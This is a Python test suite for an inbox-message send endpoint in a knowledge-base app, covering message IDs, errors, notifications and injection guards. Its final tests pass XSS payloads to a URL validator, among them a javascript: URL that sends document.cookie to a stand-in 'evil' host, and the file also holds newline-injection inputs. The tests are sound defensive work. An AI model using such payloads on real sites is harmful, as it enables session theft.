"""Tests for BZ-004: buzón send endpoint (hosted only).

No real Postgres — pool fully mocked with AsyncMock.

Covers:
- generates a valid buzón line whose ID follows AAAAMMDD-HHMM-remitente-destinatario
- collision: when the same base-ID already exists in the recipient inbox, generates with -b suffix
- texto with newline (\\n or \\r) → 400
- no sender inbox found in this KB → 400 (user must create their own inbox first)
- recipient doc not found in KB → 404
- notifies ONLY the recipient owner (directed insert, not notify_wiki_activity fan-out)
- no notification when sender == recipient (writing to own inbox)
- no KB access → 404 (route-level check)
- append_line is invoked, no direct SQL update on content
"""

from datetime import datetime
from unittest.mock import ANY, AsyncMock, MagicMock, call, patch
from uuid import UUID

import pytest
from fastapi import HTTPException

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_KB_ID = "aaaaaaaa-0000-0000-0000-000000000001"
_SENDER_DOC_ID = "cccccccc-0000-0000-0000-000000000003"
_RECIPIENT_DOC_ID = "dddddddd-0000-0000-0000-000000000004"
_SENDER_USER_ID = "eeeeeeee-0000-0000-0000-000000000005"
_RECIPIENT_USER_ID = "ffffffff-0000-0000-0000-000000000006"

_SENDER_EMAIL = "alice@example.com"
_RECIPIENT_EMAIL = "bob@example.com"

_FIXED_NOW = datetime(2026, 10, 21, 10, 30, 0)
_FIXED_DATE = "20261021"
_FIXED_TIME = "1030"

_PATCH_APPEND_LINE = "services.buzon.send.append_line"
_PATCH_DATETIME = "services.buzon.send.datetime"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _sender_inbox_row(email: str = _SENDER_EMAIL, filename: str = "alice.md") -> dict:
    """Simulates a row from the 'list inboxes in KB' query."""
    return {
        "id": _SENDER_DOC_ID,
        "filename": filename,
        "content": f"---\nemail: {email}\n---\n",
    }


def _recipient_doc_row(
    content: str = "", filename: str = "bob.md", email: str = _RECIPIENT_EMAIL
) -> dict:
    """Simulates a row from the 'get recipient doc' query."""
    frontmatter = f"---\nemail: {email}\n---\n"
    return {"content": frontmatter + content, "filename": filename}


def _make_pool_for_send(
    inboxes: list,
    recipient_row,
    recipient_user_row=None,
):
    """Build a pool mock for the common send path.

    Call order:
      1. pool.fetch  — list all buzon docs in KB (to find sender inbox)
      2. pool.fetchrow call 1 — get recipient doc (content + filename)
      3. pool.fetchrow call 2 — look up recipient's user_id by email (for notification)
    append_line is separately patched.
    """
    pool = AsyncMock()
    pool.fetch.return_value = inboxes
    fetchrow_returns = [recipient_row]
    if recipient_user_row is not None:
        fetchrow_returns.append(recipient_user_row)
    pool.fetchrow.side_effect = fetchrow_returns
    return pool


def _req(pool, user_id: str = _SENDER_USER_ID):
    """Build a minimal Request mock for calling route handlers directly."""
    req = MagicMock()
    req.app.state.pool = pool
    return req


# ---------------------------------------------------------------------------
# Service tests — services/buzon/send.py :: send_message
# ---------------------------------------------------------------------------


async def test_send_generates_line_with_correct_id():
    """Generated line ID must be YYYYMMDD-HHMM-sender_slug-recipient_slug."""
    pool = _make_pool_for_send(
        inboxes=[_sender_inbox_row()],
        recipient_row=_recipient_doc_row(),
        recipient_user_row={"id": _RECIPIENT_USER_ID},
    )

    with (
        patch(_PATCH_APPEND_LINE, new_callable=AsyncMock) as mock_append,
        patch(_PATCH_DATETIME) as mock_dt,
    ):
        mock_dt.now.return_value = _FIXED_NOW
        mock_append.return_value = {
            "id": _RECIPIENT_DOC_ID,
            "content": "",
            "version": 1,
        }

        from services.buzon.send import send_message

        result = await send_message(
            pool=pool,
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="hola mundo",
        )

    expected_id = f"{_FIXED_DATE}-{_FIXED_TIME}-alice-bob"
    assert result["ok"] is True
    assert expected_id in result["line"], (
        f"Expected ID '{expected_id}' in line: {result['line']}"
    )
    assert "Mensaje" in result["line"]
    assert "hola mundo" in result["line"]
    # Line must start with the open checkbox
    assert result["line"].startswith("- [ ] ")


async def test_send_collision_generates_b_suffix():
    """When the recipient inbox already contains a line with the same base ID
    (same YYYYMMDD-HHMM-sender-recipient), the new line gets the -b suffix."""
    base_id = f"{_FIXED_DATE}-{_FIXED_TIME}-alice-bob"
    existing_line = f"- [ ] {base_id} · Mensaje — mensaje anterior"

    pool = _make_pool_for_send(
        inboxes=[_sender_inbox_row()],
        recipient_row=_recipient_doc_row(content=existing_line),
        recipient_user_row={"id": _RECIPIENT_USER_ID},
    )

    with (
        patch(_PATCH_APPEND_LINE, new_callable=AsyncMock) as mock_append,
        patch(_PATCH_DATETIME) as mock_dt,
    ):
        mock_dt.now.return_value = _FIXED_NOW
        mock_append.return_value = {
            "id": _RECIPIENT_DOC_ID,
            "content": "",
            "version": 1,
        }

        from services.buzon.send import send_message

        result = await send_message(
            pool=pool,
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="segundo mensaje",
        )

    expected_id_b = f"{base_id}-b"
    assert expected_id_b in result["line"], (
        f"Expected '-b' collision suffix in line: {result['line']}"
    )


async def test_send_newline_raises_400():
    """texto with \\n must be rejected with HTTP 400."""
    from services.buzon.send import send_message

    with pytest.raises(HTTPException) as exc:
        await send_message(
            pool=AsyncMock(),
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="line1\nline2",
        )

    assert exc.value.status_code == 400


async def test_send_carriage_return_raises_400():
    """texto with \\r must be rejected with HTTP 400."""
    from services.buzon.send import send_message

    with pytest.raises(HTTPException) as exc:
        await send_message(
            pool=AsyncMock(),
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="line1\rline2",
        )

    assert exc.value.status_code == 400


async def test_send_no_sender_inbox_raises_400():
    """When the user has no inbox in this KB, send must return 400."""
    pool = AsyncMock()
    pool.fetch.return_value = []  # no inboxes found

    from services.buzon.send import send_message

    with pytest.raises(HTTPException) as exc:
        await send_message(
            pool=pool,
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="hola",
        )

    assert exc.value.status_code == 400


async def test_send_recipient_not_in_kb_raises_404():
    """When the recipient doc doesn't exist in the KB, send must return 404."""
    pool = AsyncMock()
    pool.fetch.return_value = [_sender_inbox_row()]
    pool.fetchrow.return_value = None  # recipient not found

    from services.buzon.send import send_message

    with pytest.raises(HTTPException) as exc:
        await send_message(
            pool=pool,
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="hola",
        )

    assert exc.value.status_code == 404


async def test_send_notifies_recipient_via_directed_insert():
    """After appending, a single INSERT into kb_notifications is issued for
    the recipient's user_id.  notify_wiki_activity must NOT be called."""
    pool = _make_pool_for_send(
        inboxes=[_sender_inbox_row()],
        recipient_row=_recipient_doc_row(),
        recipient_user_row={"id": _RECIPIENT_USER_ID},
    )

    with (
        patch(_PATCH_APPEND_LINE, new_callable=AsyncMock) as mock_append,
        patch(_PATCH_DATETIME) as mock_dt,
    ):
        mock_dt.now.return_value = _FIXED_NOW
        mock_append.return_value = {
            "id": _RECIPIENT_DOC_ID,
            "content": "",
            "version": 1,
        }

        from services.buzon.send import send_message

        await send_message(
            pool=pool,
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="hola",
        )

    # Verify a notification INSERT was executed
    assert pool.execute.called, "pool.execute should be called for kb_notifications"

    execute_sql = pool.execute.call_args[0][0]
    assert "kb_notifications" in execute_sql, (
        f"Expected INSERT into kb_notifications, got: {execute_sql}"
    )
    # Must NOT use notify_wiki_activity (fan-out function)
    for c in pool.execute.call_args_list:
        assert "notify_wiki_activity" not in c[0][0], (
            "notify_wiki_activity must not be called (fan-out forbidden)"
        )

    # The notification must target the recipient's user_id specifically
    execute_params = pool.execute.call_args[0][1:]
    assert _RECIPIENT_USER_ID in execute_params, (
        f"Expected recipient user_id {_RECIPIENT_USER_ID} in execute params: {execute_params}"
    )


async def test_send_no_notification_when_sender_is_recipient():
    """When the sender writes to their own inbox, no notification is inserted."""
    # Sender and recipient are the same person: same email on both inboxes
    pool = _make_pool_for_send(
        inboxes=[_sender_inbox_row(email=_SENDER_EMAIL)],
        recipient_row=_recipient_doc_row(email=_SENDER_EMAIL, filename="alice.md"),
        recipient_user_row=None,  # no user lookup needed
    )

    with (
        patch(_PATCH_APPEND_LINE, new_callable=AsyncMock) as mock_append,
        patch(_PATCH_DATETIME) as mock_dt,
    ):
        mock_dt.now.return_value = _FIXED_NOW
        mock_append.return_value = {
            "id": _RECIPIENT_DOC_ID,
            "content": "",
            "version": 1,
        }

        from services.buzon.send import send_message

        await send_message(
            pool=pool,
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="nota para mí",
        )

    # pool.execute must not be called for notifications
    for c in pool.execute.call_args_list:
        assert "kb_notifications" not in c[0][0], (
            "Should not insert kb_notifications when sender == recipient"
        )


async def test_send_uses_append_line_not_direct_sql():
    """append_line must be called; content must not be written via direct SQL UPDATE."""
    pool = _make_pool_for_send(
        inboxes=[_sender_inbox_row()],
        recipient_row=_recipient_doc_row(),
        recipient_user_row={"id": _RECIPIENT_USER_ID},
    )

    with (
        patch(_PATCH_APPEND_LINE, new_callable=AsyncMock) as mock_append,
        patch(_PATCH_DATETIME) as mock_dt,
    ):
        mock_dt.now.return_value = _FIXED_NOW
        mock_append.return_value = {
            "id": _RECIPIENT_DOC_ID,
            "content": "",
            "version": 1,
        }

        from services.buzon.send import send_message

        await send_message(
            pool=pool,
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="hola",
        )

    # append_line must be called with pool + named args matching its signature
    # (pool, doc_id, line, user_id).  Named args make the assertion robust
    # against future reordering of the keyword parameters.
    # ANY covers the generated line content, whose exact value is tested elsewhere.
    mock_append.assert_called_once_with(
        pool,
        doc_id=_RECIPIENT_DOC_ID,
        line=ANY,
        user_id=_SENDER_USER_ID,
    )

    # No direct UPDATE on documents content (that would bypass append_line)
    for c in pool.execute.call_args_list:
        sql = c[0][0].upper()
        assert not (
            sql.startswith("UPDATE") and "DOCUMENTS" in sql and "CONTENT" in sql
        ), f"Direct SQL UPDATE on documents detected: {c[0][0]}"


# ---------------------------------------------------------------------------
# Route tests — routes/buzon.py :: send_message_endpoint
# ---------------------------------------------------------------------------


async def test_send_endpoint_no_kb_access_raises_404():
    """When the user has no access to the KB, the send endpoint returns 404."""
    pool = AsyncMock()
    pool.fetchrow.return_value = {"role": "viewer"}  # not superadmin
    pool.fetchval.return_value = None  # no KB access

    import routes.buzon as buzon_routes

    from services.buzon.send import SendBody

    body = SendBody(
        recipient_doc_id=_RECIPIENT_DOC_ID,
        tipo="Mensaje",
        texto="hola",
    )

    with pytest.raises(HTTPException) as exc:
        await buzon_routes.send_message_endpoint(
            kb_id=UUID(_KB_ID),
            body=body,
            user_id=_SENDER_USER_ID,
            request=_req(pool),
        )

    assert exc.value.status_code == 404


# ---------------------------------------------------------------------------
# Injection prevention — BZ-004 BLOQUEANTE
# Each optional string field that reaches build_line must reject newlines.
# ---------------------------------------------------------------------------


def _pool_with_valid_inboxes():
    """Pool configured to succeed through sender/recipient lookup.

    Validation tests need the pool to return valid sender + recipient data so
    that a 400 can only come from the newline guard, not from a missing inbox.
    """
    return _make_pool_for_send(
        inboxes=[_sender_inbox_row()],
        recipient_row=_recipient_doc_row(),
        recipient_user_row={"id": _RECIPIENT_USER_ID},
    )


async def test_send_label_newline_raises_400():
    """EnlaceItem.label with \\n must be rejected with HTTP 400 (line-injection guard).

    The pool is configured with valid inboxes so the 400 can only come from
    the newline check on label, not from a missing sender inbox.
    """
    from services.buzon.send import EnlaceItem, send_message

    with (
        patch(_PATCH_APPEND_LINE, new_callable=AsyncMock),
        patch(_PATCH_DATETIME) as mock_dt,
        pytest.raises(HTTPException) as exc,
    ):
        mock_dt.now.return_value = _FIXED_NOW
        await send_message(
            pool=_pool_with_valid_inboxes(),
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="legítimo",
            enlaces=[EnlaceItem(label="x\ninjected", url="http://x.com")],
        )

    assert exc.value.status_code == 400


async def test_send_url_newline_raises_400():
    """EnlaceItem.url with \\n must be rejected with HTTP 400 (line-injection guard).

    The pool is configured with valid inboxes so the 400 can only come from
    the newline check on url, not from a missing sender inbox.
    """
    from services.buzon.send import EnlaceItem, send_message

    with (
        patch(_PATCH_APPEND_LINE, new_callable=AsyncMock),
        patch(_PATCH_DATETIME) as mock_dt,
        pytest.raises(HTTPException) as exc,
    ):
        mock_dt.now.return_value = _FIXED_NOW
        await send_message(
            pool=_pool_with_valid_inboxes(),
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Mensaje",
            texto="legítimo",
            enlaces=[EnlaceItem(label="ok", url="http://x.com\ninjected")],
        )

    assert exc.value.status_code == 400


async def test_send_plazo_newline_raises_400():
    """plazo with \\n must be rejected with HTTP 400 (line-injection guard).

    The pool is configured with valid inboxes so the 400 can only come from
    the newline check on plazo, not from a missing sender inbox.
    """
    from services.buzon.send import send_message

    with (
        patch(_PATCH_APPEND_LINE, new_callable=AsyncMock),
        patch(_PATCH_DATETIME) as mock_dt,
        pytest.raises(HTTPException) as exc,
    ):
        mock_dt.now.return_value = _FIXED_NOW
        await send_message(
            pool=_pool_with_valid_inboxes(),
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Tarea",
            texto="legítimo",
            plazo="2026-12-31\ninjected",
        )

    assert exc.value.status_code == 400


async def test_send_reply_to_newline_raises_400():
    """reply_to with \\n must be rejected with HTTP 400 (line-injection guard).

    The pool is configured with valid inboxes so the 400 can only come from
    the newline check on reply_to, not from a missing sender inbox.
    """
    from services.buzon.send import send_message

    with (
        patch(_PATCH_APPEND_LINE, new_callable=AsyncMock),
        patch(_PATCH_DATETIME) as mock_dt,
        pytest.raises(HTTPException) as exc,
    ):
        mock_dt.now.return_value = _FIXED_NOW
        await send_message(
            pool=_pool_with_valid_inboxes(),
            kb_id=_KB_ID,
            sender_user_id=_SENDER_USER_ID,
            sender_email=_SENDER_EMAIL,
            recipient_doc_id=_RECIPIENT_DOC_ID,
            tipo="Respuesta",
            texto="legítimo",
            reply_to="msg-id\ninjected",
        )

    assert exc.value.status_code == 400


# ---------------------------------------------------------------------------
# URL protocol validation — BZ-008 BLOQUEANTE (XSS stored via link)
# enlaces[].url must start with http:// or https://; any other scheme is
# rejected at write-time so the unsafe URL is never stored or served.
# ---------------------------------------------------------------------------


def test_reject_bad_url_javascript_raises_400():
    """javascript: URL must be rejected — clicking it executes arbitrary code."""
    from services.buzon.guards import reject_bad_url

    with pytest.raises(HTTPException) as exc:
        reject_bad_url(
            "enlaces[0].url", "javascript:fetch('https://evil/'+document.cookie)"
        )
    assert exc.value.status_code == 400


def test_reject_bad_url_data_raises_400():
    """data: URL is a XSS vector (inline HTML/JS) and must be rejected."""
    from services.buzon.guards import reject_bad_url

    with pytest.raises(HTTPException) as exc:
        reject_bad_url("enlaces[0].url", "data:text/html,<script>alert(1)</script>")
    assert exc.value.status_code == 400


def test_reject_bad_url_javascript_uppercase_raises_400():
    """Protocol check must be case-insensitive (JAVASCRIPT: bypasses naive checks)."""
    from services.buzon.guards import reject_bad_url

    with pytest.raises(HTTPException) as exc:
        reject_bad_url("enlaces[0].url", "JAVASCRIPT:alert(1)")
    assert exc.value.status_code == 400


def test_reject_bad_url_http_passes():
    """http:// URLs are allowed — must not raise."""
    from services.buzon.guards import reject_bad_url

    reject_bad_url("enlaces[0].url", "http://example.com/path")


def test_reject_bad_url_https_passes():
    """https:// URLs are allowed — must not raise."""
    from services.buzon.guards import reject_bad_url

    reject_bad_url("enlaces[0].url", "https://example.com/path?q=1")


def test_reject_bad_url_error_includes_field_name():
    """The 400 detail message must include the field name for debuggability."""
    from services.buzon.guards import reject_bad_url

    with pytest.raises(HTTPException) as exc:
        reject_bad_url("enlaces[2].url", "javascript:evil()")
    assert "enlaces[2].url" in exc.value.detail.get("message", "")
